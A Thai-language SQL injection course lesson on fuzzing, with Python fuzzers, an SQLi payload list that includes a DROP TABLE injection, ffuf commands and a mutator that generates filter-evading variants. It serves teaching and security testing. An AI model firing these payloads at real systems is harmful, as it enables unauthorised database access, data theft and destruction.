# Part 063: Fuzzing เพื่อหา SQL Injection

## ภาพรวม

การใช้ fuzzing สำหรับค้นหา SQL injection โดยอัตโนมัติ

**ขั้นตอนที่ 1016-1030**

---

## 1016. Fuzzing Basics

```python
# SQLi Fuzzer เบื้องต้น

FUZZ_PAYLOADS = [
    # Quote variations
    "'", '"', '`', "'';", "';",
    # Comment variations  
    "'--", "'-- -", "'#", "'/*",
    # Boolean
    "' OR 1=1--", "' OR '1'='1",
    "' AND 1=2--", "' AND '1'='2",
    # UNION
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND 1=CONVERT(int,@@version)--",
    # Time-based
    "' AND SLEEP(1)--",
    "'; WAITFOR DELAY '0:0:1'--",
    # Stacked
    "'; SELECT 1--",
    "'; DROP TABLE fuzz_test--",
    # Special chars
    "\x00", "\x1a", "\u0000",
    "%00", "%27", "%2527",
]

ERROR_SIGNATURES = [
    # MySQL
    'you have an error in your sql syntax',
    'warning: mysql_',
    'mysql_fetch_array()',
    'unclosed quotation mark',
    # MSSQL
    'microsoft ole db provider for sql server',
    'incorrect syntax near',
    'unclosed quotation mark after the character string',
    # PostgreSQL
    'pg_query():',
    'postgresql query failed',
    'error: unterminated quoted string',
    # Oracle
    'ora-00907',
    'ora-00933',
    'ora-00942',
    # SQLite
    'sqlite3::query',
    'near "syntax error"',
]

import requests
import time

def fuzz_parameter(url: str, param: str, method: str = 'GET'):
    """Fuzz a single parameter for SQL injection"""
    found = []
    
    for payload in FUZZ_PAYLOADS:
        try:
            start = time.time()
            if method == 'GET':
                r = requests.get(url, params={param: payload}, timeout=5)
            else:
                r = requests.post(url, data={param: payload}, timeout=5)
            elapsed = time.time() - start
            
            content = r.text.lower()
            
            # ตรวจสอบ error signatures
            for sig in ERROR_SIGNATURES:
                if sig in content:
                    found.append({'payload': payload, 'type': 'error', 'signature': sig})
                    break
            
            # ตรวจสอบ time delay
            if elapsed > 0.9 and 'sleep' in payload.lower():
                found.append({'payload': payload, 'type': 'time', 'elapsed': elapsed})
            
        except requests.Timeout:
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                found.append({'payload': payload, 'type': 'time', 'elapsed': '>5s'})
        except Exception:
            pass
    
    return found
```

---

## 1017. เครื่องมือ Fuzzing: ffuf

```bash
# การใช้ ffuf สำหรับ SQL injection fuzzing

# ติดตั้ง:
go install github.com/ffuf/ffuf/v2@latest

# Fuzz GET parameter:
ffuf -u 'http://target/page?id=FUZZ' \
  -w /path/to/sqli-payloads.txt \
  -mr 'sql|mysql|syntax|error|warning' \
  -o results.json

# Fuzz POST body:
ffuf -u 'http://target/login' \
  -X POST \
  -d 'username=FUZZ&password=test' \
  -w /path/to/sqli-payloads.txt \
  -mr 'sql|error|invalid' \
  -H 'Content-Type: application/x-www-form-urlencoded'

# สร้าง wordlist จาก Python:
python3 -c "
payloads = [\"'\", '\"', \"' OR 1=1--\", \"' UNION SELECT NULL--\", \"' AND SLEEP(3)--\"]
print('\\n'.join(payloads))
" > sqli_fuzz.txt
```

---

## 1018. Mutation-Based Fuzzing

```python
import random
import string

class SQLiMutator:
    """Mutate existing payloads เพื่อสร้าง variants"""
    
    BASE_PAYLOADS = [
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' AND SLEEP(3)--",
    ]
    
    def mutate(self, payload: str, count: int = 10) -> list:
        mutations = []
        for _ in range(count):
            m = payload
            choice = random.randint(0, 5)
            
            if choice == 0:  # แทน space
                m = m.replace(' ', random.choice(['/**/', '\t', '%09', '%0a']))
            elif choice == 1:  # case variation
                m = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in m)
            elif choice == 2:  # เพิ่ม comment
                pos = random.randint(1, len(m)-1)
                m = m[:pos] + '/**/' + m[pos:]
            elif choice == 3:  # URL encode ส่วนหนึ่ง
                idx = random.randint(0, len(m)-1)
                m = m[:idx] + f'%{ord(m[idx]):02x}' + m[idx+1:]
            elif choice == 4:  # เพิ่ม junk
                junk = ''.join(random.choices(string.ascii_letters, k=3))
                m = m + f'/*{junk}*/'
            elif choice == 5:  # double encode
                m = m.replace("'", "%2527")
            
            mutations.append(m)
        
        return list(set(mutations))
    
    def generate_all(self, count_per_base: int = 20) -> list:
        all_payloads = list(self.BASE_PAYLOADS)
        for base in self.BASE_PAYLOADS:
            all_payloads.extend(self.mutate(base, count_per_base))
        return all_payloads

# Usage
mutator = SQLiMutator()
payloads = mutator.generate_all()
print(f"Generated {len(payloads)} payloads")
```

---

## 1019. Coverage-Guided Fuzzing

```python
# ใช้ response differences เป็น feedback signal

import hashlib
import requests

class CoverageGuidedFuzzer:
    def __init__(self, url: str, param: str):
        self.url = url
        self.param = param
        self.seen_responses = set()
        self.interesting = []
    
    def get_baseline(self) -> tuple:
        r = requests.get(self.url, params={self.param: '1'}, timeout=5)
        return r.status_code, len(r.text), hashlib.md5(r.text.encode()).hexdigest()
    
    def is_interesting(self, r, baseline: tuple) -> bool:
        base_status, base_len, base_hash = baseline
        resp_hash = hashlib.md5(r.text.encode()).hexdigest()
        
        # response เปลี่ยนแปลกหรือไม่ถูกเคยเห็น
        if resp_hash in self.seen_responses:
            return False
        
        self.seen_responses.add(resp_hash)
        
        # ตรวจสอบความแตกต่าง
        if r.status_code != base_status:
            return True
        if abs(len(r.text) - base_len) > 100:  # size difference > 100 bytes
            return True
        
        return False
    
    def fuzz(self, payloads: list):
        baseline = self.get_baseline()
        print(f"Baseline: status={baseline[0]}, len={baseline[1]}")
        
        for payload in payloads:
            try:
                r = requests.get(self.url, params={self.param: payload}, timeout=5)
                if self.is_interesting(r, baseline):
                    self.interesting.append({
                        'payload': payload,
                        'status': r.status_code,
                        'len': len(r.text),
                    })
                    print(f"[+] Interesting: {payload[:50]} -> {r.status_code} ({len(r.text)} bytes)")
            except Exception:
                pass
        
        return self.interesting
```

---

## สรุป

Fuzzing for SQL Injection:
- **Basic fuzzing** - error signatures, time delays
- **ffuf** - เครื่องมือ CLI สำหรับ web fuzzing
- **Mutation** - สร้าง payload variants อัตโนมัติ
- **Coverage-guided** - ใช้ response differences เป็น feedback

---

*Part 063 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
